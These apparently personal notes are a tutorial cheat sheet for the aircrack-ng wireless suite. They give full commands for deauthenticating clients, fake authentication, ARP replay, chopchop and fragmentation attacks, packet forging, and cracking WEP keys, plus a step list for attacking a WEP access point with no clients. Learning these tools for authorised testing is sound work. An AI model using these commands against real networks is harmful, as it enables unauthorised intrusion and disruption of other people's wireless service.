# Notes on wifi configs and setup

## Getting started

Check the wireless interface(s) with `iwconfig` and start monitoring mode.
```
$ airmon-ng start wlx9cefd5fd1181
```

Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_test) work.
```
$ aireplay-ng -9 -e dd-wrt wlan0mon
```

Find surrounding networks, access points and clients
```bash
$ airodump-ng wlan0mon
```

Begin collection on target channel, BSSID and recording to file.
  - `-c` Select channel number
  - `-w` Write to file
  - `--bssid` MAC address of access point
  - `--ivs` Save only captured IVs (optional)
```bash
$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture wlan0mon
```

## WEP without clients
Steps to perform an attack on a WEP access point with no associated clients.
  1) Monitor and capture the target network traffic using `airodump-ng`.
  2) In a new console execute Fake Authentication attack method.
  3) In a new console execute Fragmentation attack method and wait.
  4) If #3 is not working, run chopchop attack.
  5) Create arp packet with `packetforge-ng`.
  6) Inject the arp packet using `aireplay-ng -2`.
  

## aircrack-ng
Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
```bash
$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
```

Invoke PTW WEP cracking method method on an arp replay.
```bash
$ aircrack-ng -z replay_arp-0309-015802.cap
```

## airmon-ng
Set interface to monitor mode.
```bash
$ airmon-ng start wlx9cefd5fd1181
```

Stop monitor mode and restart networking.
```
$ airmon-ng stop wlan0mon
$ systemctl restart network-manager.service
```

Checking and kill networking services.
```
$ airmon-ng check kill
```

## aireplay-ng
### Deauthentication
Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
  - `-0` Set for `deauthentication` mode
  - `-e` Target access point ESSID
  - `-a` Target access point MAC address
  - `-c` Set destination MAC address
```bash
$ aireplay-ng -0 5 -e access_point -a A0:21:B7:60:2E:65 -c AC:65:21:B7:2E:60 wlan1
```

### Fake Authentication
Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
  - `-1` Set for fake authentication attack
  - `180` Reassociation timing in seconds
  - `-o` Number of packets to send at a time
  - `-q` Frequency to send keep-alive packets
  - `-e` Target access point network name
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
```

## Interactive packet replay
Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
  - `-2` Set for interactive packet replay attack mode
  - `-r` ARP file to replay
```bash
$ aireplay-ng -2 -r arp-request wlan0mon
```

## ARP request replay attack
Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
  - `-3` Set for ARP request replay attack mode
  - `-x` Number of packets-per-second
  - `-r` Extract packets from target pcap file
  - `-b` Target access point BSSID
  - `-h` Set source MAC address
```bash
$ aireplay-ng -3 -x 100 -r replay.cap -b ap_mac -h our_mac wlan0mon
```

## KoreK chopchop attack
Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
  - `-4` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
```

## Fragmentation attack
Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation).
  - `-5` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
```

## packetforge-ng
Generate packets for injection from PRGA capture.
  - `-0` Set for generate arp packet
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
  - `-k` Destination IP address (255.255.255.255)
  - `-l` Source IP address (255.255.255.255)
  - `-y` XOR file to read the PRGA from
  - `-w` Write to file
```bash
packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
``` 

## Renaming interface (temporary)
Rename target interface to `wlan1` instead of systemd generated name.
```bash
$ iwconfig | grep wlx
wlx9cefd5fd1181  IEEE 802.11  ESSID:off/any 
$ ip link set wlx9cefd5fd1181 down
$ ip link set wlx9cefd5fd1181 name wlan1
$ ip link set wlan1 up
$ systemctl restart network-manager.service
```
[Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)

## Sources
[Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
